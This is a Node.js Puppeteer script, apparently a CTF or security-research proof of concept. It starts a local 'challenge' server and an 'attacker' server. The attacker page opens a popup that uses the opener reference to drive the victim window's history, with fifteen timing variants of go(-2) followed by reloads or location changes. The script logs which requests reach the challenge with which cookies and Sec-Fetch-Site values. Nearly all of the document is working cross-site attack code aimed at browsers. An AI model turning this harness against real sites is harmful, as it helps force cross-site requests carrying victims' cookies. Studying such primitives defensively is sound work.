const http = require('node:http');
const puppeteer = require('puppeteer');

const modes = {
  sync: `h.go(-2); h.go(0)`,
  micro: `h.go(-2); queueMicrotask(() => h.go(0))`,
  timer0: `h.go(-2); setTimeout(() => h.go(0), 0)`,
  timer20: `h.go(-2); setTimeout(() => h.go(0), 20)`,
  timer100: `h.go(-2); setTimeout(() => h.go(0), 100)`,
  timer500: `h.go(-2); setTimeout(() => h.go(0), 500)`,
  bound0: `const reload = w.location.reload.bind(w.location); h.go(-2); setTimeout(reload, 0)`,
  bound100: `const reload = w.location.reload.bind(w.location); h.go(-2); setTimeout(reload, 100)`,
  nav0: `const nav = w.navigation; h.go(-2); setTimeout(() => nav.reload(), 0)`,
  nav100: `const nav = w.navigation; h.go(-2); setTimeout(() => nav.reload(), 100)`,
  nav500: `const nav = w.navigation; h.go(-2); setTimeout(() => nav.reload(), 500)`,
  assignhash: `h.go(-2); setTimeout(() => w.location = '#probe', 500)`,
  replacehash: `h.go(-2); setTimeout(() => w.location.replace('#probe'), 500)`,
  assignempty: `h.go(-2); setTimeout(() => w.location = '', 500)`,
  replaceempty: `h.go(-2); setTimeout(() => w.location.replace(''), 500)`,
};

(async () => {
  for (const [mode, action] of Object.entries(modes)) {
    const seen = [];
    let challenge;
    let attacker;
    challenge = http.createServer((req, res) => {
      seen.push({ url: req.url, site: req.headers['sec-fetch-site'], cookie: req.headers.cookie || '' });
      res.setHeader('content-type', 'text/html');
      res.setHeader('cross-origin-opener-policy', 'same-origin');
      if (req.url.startsWith('/check')) {
        res.setHeader('vary', 'Cookie');
        if (!(req.headers.cookie || '').includes('view=1')) res.setHeader('set-cookie', 'view=1; Path=/check; SameSite=Lax');
        res.end('check');
      } else if (req.url === '/api') res.end('api');
      else res.end('other');
    });
    attacker = http.createServer((req, res) => {
      res.setHeader('content-type', 'text/html');
      res.setHeader('cache-control', 'no-store');
      if (req.url === '/attack') res.end(`<script>open('/helper','h')</script>`);
      else if (req.url === '/helper') res.end(`<script>setTimeout(()=>{const w=opener,h=w.history;try{${action}}catch(e){document.title=e.name+':'+e.message}},300)</script>`);
      else res.end('x');
    });
    await Promise.all([
      new Promise(resolve => challenge.listen(0, 'localhost', resolve)),
      new Promise(resolve => attacker.listen(0, '127.0.0.1', resolve)),
    ]);
    const browser = await puppeteer.launch({ executablePath: process.env.CHROME_PATH, headless: 'new' });
    const page = await browser.newPage();
    await page.goto(`http://localhost:${challenge.address().port}/check?state=s`);
    await page.goto(`http://localhost:${challenge.address().port}/api`);
    await page.goto(`http://127.0.0.1:${attacker.address().port}/attack`);
    await new Promise(resolve => setTimeout(resolve, 1200));
    console.log(mode, { seen, pages: (await browser.pages()).map(p => p.url()) });
    await browser.close();
    await Promise.all([new Promise(resolve => challenge.close(resolve)), new Promise(resolve => attacker.close(resolve))]);
  }
})();
